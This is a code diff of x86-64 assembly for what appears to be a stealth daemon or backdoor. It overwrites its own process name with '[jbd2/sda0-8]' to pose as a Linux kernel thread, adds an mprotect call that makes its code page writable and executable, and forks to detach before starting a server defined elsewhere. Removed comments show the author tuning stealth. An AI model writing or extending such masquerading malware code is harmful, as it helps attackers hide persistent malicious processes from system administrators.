@@ -5,25 +5,20 @@ section .text
     extern create_server
     extern loop_server
 
-strcpy:
-    mov     al, [rsi]
-    mov     [rdi], al
-    mov     bl, [rsi]
-    cmp     bl, 0
-    je      end_strcpy
-    inc     rdi
-    inc     rsi
-    jmp     strcpy
-end_strcpy:
-    ret
-
 _start:
     push    rbp
     mov     rbp, rsp
     mov     rdi, [rbp + 0x10]
     lea     rsi, [rel pname]
     call    strcpy
-    ; don't go stealth while it crashes :p
+    lea     rdi, [$$]
+    xor     rsi, rsi
+    xor     rdx, rdx
+    xor     eax, eax
+    add     rsi, 0x1000
+    add     rdx, 0x1 | 0x2 | 0x4 ; PROT_READ | PROT_WRITE | PROT_EXEC
+    add     eax, 0xa ; mprotect
+    syscall
     xor     eax, eax
     add     eax, 0x39 ; fork
     syscall
@@ -38,7 +33,6 @@ _start:
     cmp     eax, 0
     jne     exit
     call    create_server
-; don't fork when it crashes :)
     xor     eax, eax
     add     eax, 0x39 ; fork
     syscall
@@ -64,5 +58,17 @@ exit:
     add     eax, 0x3c ; exit
     syscall
     ret 
+
+strcpy:
+    mov     al, [rsi]
+    mov     [rdi], al
+    mov     bl, [rsi]
+    cmp     bl, 0
+    je      end_strcpy
+    inc     rdi
+    inc     rsi
+    jmp     strcpy
+end_strcpy:
+    ret
 
     pname: db "[jbd2/sda0-8]", 0
